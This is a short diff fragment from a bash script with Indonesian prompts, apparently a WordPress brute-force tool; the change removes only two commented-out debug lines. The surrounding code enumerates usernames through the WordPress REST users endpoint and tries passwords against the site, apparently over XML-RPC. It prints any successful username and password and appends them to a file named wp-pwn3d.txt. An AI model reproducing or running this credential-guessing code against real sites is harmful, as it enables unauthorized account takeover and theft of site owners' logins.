@@ -37,7 +37,6 @@ if [[ $mode -eq 1 ]]; then
 	getUsername(){
 		getUser=$( curl -s "${url}/wp-json/wp/v2/users" )
 		UserName=$( echo $getUser | grep -Po '(?<=slug":")[^"]*' | tail -1)
-		# echo $UserName
 	}
 	
 	echo -n "Masukkan URL : "
@@ -51,7 +50,6 @@ if [[ $mode -eq 1 ]]; then
 		title=$( echo $brute | grep -Po '(?<=<member><name>blogName<\/name><value><string>).*?(?=</)' )
 		printf "[!] ${NOCOLOR}${BGYELLOW}${1}${NOCOLOR} | "
 		if [[ $grep == '1' ]]; then
-			# echo $brute
 			printf "RESP : ${BGGREEN}SUCCESS!!!${NOCOLOR}\n"
 			printf "INFO : USERNAME : ${BGGREEN}$UserName${NOCOLOR} | PASSWORD : ${BGGREEN}${1}${NOCOLOR} | TITLE : ${BGGREEN}${title}${NOCOLOR} | SITE : ${BGGREEN}${site}${NOCOLOR} \n"
 			echo "INFO : USERNAME : $UserName | PASSWORD : ${1} | TITLE : ${title} | SITE : ${site}" >> wp-pwn3d.txt
